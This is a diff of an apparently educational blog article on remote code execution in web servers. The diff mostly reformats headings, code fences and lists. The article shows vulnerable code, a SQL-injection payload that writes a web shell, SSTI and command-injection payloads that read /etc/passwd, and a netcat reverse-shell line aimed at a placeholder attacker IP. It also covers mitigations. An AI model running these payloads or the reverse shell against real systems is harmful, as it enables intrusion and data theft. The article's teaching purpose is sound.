@@ -36,17 +36,17 @@ RCE bypasses regular access controls and security mechanisms, offering an attack
 
 ---
 
-## **Common RCE Vulnerability Types in Web Servers**
+## Common RCE Vulnerability Types in Web Servers
 
-[![Common RCE Vulnerability Types in Web Servers](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fse2i2fx2wp6nax6x2tau.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fse2i2fx2wp6nax6x2tau.png)
+![Common RCE Vulnerability Types in Web Servers](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/se2i2fx2wp6nax6x2tau.png align="left")
 
-## **Injection Vulnerabilities:**
+## Injection Vulnerabilities:
 
-### **Command Injection**
+### Command Injection
 
 Attackers exploit poor input validation to inject system-level commands. For instance:
 
-```plaintext
+```php
 <?php $cmd = $_GET['cmd']; system($cmd); ?>
 ```
 
@@ -54,31 +54,31 @@ A URL like [`example.com/vuln.php?cmd=whoami`](http://example.com/vuln.php?cmd=w
 
 **Other affected platforms:** Node.js (via `child_process.exec()`), Python’s `os.system()`.
 
-### **SQL Injection to RCE**
+### SQL Injection to RCE
 
 While SQL injection typically targets databases, it can morph into RCE. Example:
 
-```plaintext
+```sql
 ' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'
 ```
 
 This creates a web shell, granting attackers full command execution.
 
-### **LDAP Injection**
+### LDAP Injection
 
 Less common but equally deadly. Malformed LDAP queries can expose authentication flows or be chained with other flaws to achieve RCE.
 
 ---
 
-## **Insecure Deserialization: The Hidden Backdoor**
+## Insecure Deserialization: The Hidden Backdoor
 
-[![Insecure Deserialization](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fidzeqbgtlzb7wdksxgg8.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fidzeqbgtlzb7wdksxgg8.png)
+![Insecure Deserialization](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/idzeqbgtlzb7wdksxgg8.png align="left")
 
 When apps deserialize user input without verification, they open the door to arbitrary object injection and code execution.
 
-### **Example in Python Flask:**
+### Example in Python Flask:
 
-```plaintext
+```python
 user = pickle.loads(base64.b64decode(request.form['payload']))
 ```
 
@@ -88,13 +88,13 @@ A crafted payload can execute commands when the server processes it.
 
 ---
 
-## **File Inclusion Vulnerabilities (LFI & RFI)**
+## File Inclusion Vulnerabilities (LFI & RFI)
 
-[![File Inclusion Vulnerabilities](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fi8t8lg9q3yny4zchgjqq.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fi8t8lg9q3yny4zchgjqq.png)
+![File Inclusion Vulnerabilities](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i8t8lg9q3yny4zchgjqq.png align="left")
 
 When applications dynamically include files based on user input:
 
-```plaintext
+```php
 <?php include($_GET['page'].".php"); ?>
 ```
 
@@ -102,21 +102,20 @@ Attackers can exploit this for **Local File Inclusion** (`../../etc/passwd`) or 
 
 ---
 
-## **File Upload Vulnerabilities**
+## File Upload Vulnerabilities
 
 Unvalidated file uploads allow attackers to deploy malicious scripts:
 
-```plaintext
+```php
 move_uploaded_file($_FILES['file']['tmp_name'], "uploads/".$_FILES['file']['name']);
 ```
 
 If `shell.php` is uploaded, it can be triggered with:  
-  
 [`example.com/uploads/shell.php?cmd=ls`](http://example.com/uploads/shell.php?cmd=ls)
 
 ---
 
-## **Buffer Overflow: Old But Gold**
+## Buffer Overflow: Old But Gold
 
 Often seen in native-code applications, buffer overflows let attackers overwrite memory—including return addresses—to hijack control flow and run injected shellcode.
 
@@ -124,13 +123,13 @@ Though rare in high-level web frameworks, these remain relevant in **embedded we
 
 ---
 
-## **Server-Side Template Injection (SSTI)**
+## Server-Side Template Injection (SSTI)
 
-[![Server-Side Template Injection](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ftnlkymfi01v5lpouobbh.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ftnlkymfi01v5lpouobbh.png)
+![Server-Side Template Injection](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tnlkymfi01v5lpouobbh.png align="left")
 
 Popular in Python’s Jinja2 or Ruby’s ERB, SSTI occurs when user input is embedded in templates without sanitization:
 
-```plaintext
+```python
 template = Template(user_input)
 ```
 
@@ -140,7 +139,7 @@ An attacker can inject `{{config.items()}}` or worse, `{{().__class__.__bases__[
 
 ## **How Hackers Exploit RCE (Step-by-Step)**
 
-[![How Hackers Exploit RCE](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F4ibjxaimf1cer7y57bgm.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F4ibjxaimf1cer7y57bgm.png)
+![How Hackers Exploit RCE](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ibjxaimf1cer7y57bgm.png align="left")
 
 ### **1\. Reconnaissance**
 
@@ -153,14 +152,14 @@ An attacker can inject `{{config.items()}}` or worse, `{{().__class__.__bases__[
 
 * **Command Injection (PHP)**:
     
-    ```plaintext
+    ```php
     <?php $cmd = $_GET['cmd']; system($cmd); ?>
     // Exploited with: ?cmd=whoami
     ```
     
 * **Command Injection (Node.js)**:
     
-    ```plaintext
+    ```js
     const { exec } = require('child_process');
     exec(`ls -l ${userInput}`, ...);
     // ?input=; cat /etc/passwd
@@ -168,7 +167,7 @@ An attacker can inject `{{config.items()}}` or worse, `{{().__class__.__bases__[
     
 * **SQL Injection Leading to RCE**:
     
-    ```plaintext
+    ```php
     <?php
     $query = "SELECT * FROM users WHERE username = '". $_GET['username']. "'";
     // Payload: ' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE ...
@@ -177,14 +176,14 @@ An attacker can inject `{{config.items()}}` or worse, `{{().__class__.__bases__[
     
 * **Insecure Deserialization (Python + Pickle)**:
     
-    ```plaintext
+    ```python
     import pickle
     user = pickle.loads(base64.b64decode(request.form['payload']))
     ```
     
 * **File Upload**:
     
-    ```plaintext
+    ```php
     <?php move_uploaded_file($_FILES['file']['tmp_name'], "uploads/". $_FILES['file']['name']); ?>
     // Upload: shell.php with system($_GET['cmd'])
     ```
@@ -194,7 +193,7 @@ An attacker can inject `{{config.items()}}` or worse, `{{().__class__.__bases__[
 
 * Reverse Shell Example (Linux):
     
-    ```plaintext
+    ```bash
     nc <attacker_ip> <port> -e /bin/bash
     ```
     
@@ -227,7 +226,7 @@ An attacker can inject `{{config.items()}}` or worse, `{{().__class__.__bases__[
 
 ### **Recent High-Profile RCE Case Studies**
 
-[![Recent High-Profile RCE Case Studies](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fmyl6ck8miryuewpjzuxj.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fmyl6ck8miryuewpjzuxj.png)
+![Recent High-Profile RCE Case Studies](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/myl6ck8miryuewpjzuxj.png align="left")
 
 #### **1\. Ivanti Connect Secure and Policy Secure (CVE-2024-21887 & CVE-2023-46805)**
 
@@ -274,75 +273,56 @@ An attacker can inject `{{config.items()}}` or worse, `{{().__class__.__bases__[
 
 ## **Mitigation Strategies**
 
-[![Mitigation Strategies](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fcramu67wokc4jxjkg04k.png align="left")](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fcramu67wokc4jxjkg04k.png)
+![Mitigation Strategies](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cramu67wokc4jxjkg04k.png align="left")
 
 1. **Secure Coding**
     
-
-```plaintext
-- Sanitize input
-
-- Use parameterized queries
-
-- Avoid `eval()`, `system()` in code
-```
-
-1. **Patching & Updates**
+    * Sanitize input
+        
+    * Use parameterized queries
+        
+    * Avoid `eval()`, `system()` in code
+        
+2. **Patching & Updates**
     
-
-```plaintext
-- Automate patch cycles
-
-- Apply security advisories ASAP
-```
-
-1. **Web Application Firewall (WAF)**
+    * Automate patch cycles
+        
+    * Apply security advisories ASAP
+        
+3. **Web Application Firewall (WAF)**
     
-
-```plaintext
-- Detect common payloads, block them
-```
-
-1. **Least Privilege Principle**
+    * Detect common payloads, block them
+        
+4. **Least Privilege Principle**
     
-
-```plaintext
-- Run processes as non-root users
-```
-
-1. **Secure Deserialization**
+    * Run processes as non-root users
+        
+5. **Secure Deserialization**
     
-
-```plaintext
-- Use JSON or integrity-checked formats
-```
-
-1. **Penetration Testing & Audits**
+    * Use JSON or integrity-checked formats
+        
+6. **Penetration Testing & Audits**
     
-
-```plaintext
-- Simulate attacks to find weaknesses
-```
+    * Simulate attacks to find weaknesses
+        
 
 ---
 
-## **Expert Insights**
+## Expert Insights
 
 > “The vast majority of RCE exploits we observe in the wild target unpatched known vulnerabilities. Patch lag is the real enemy.”  
->   
 > — *Katie Moussouris*, Founder & CEO of Luta Security
-> 
+
 > “Secure deserialization is still poorly understood by developers. It’s a silent killer in enterprise software.”  
->   
 > — *Adam Shostack*, Threat Modeling Expert, former Microsoft Security Architect
 
 ---
 
-## **Conclusion**
+## Conclusion
 
 From command injection to unsafe file uploads, the most common RCE vulnerabilities arise from predictable, often preventable flaws in application logic and security hygiene.
 
-### **Key Takeaways:**
+### Key Takeaways:
 
 * **Validate all input**, always.
     
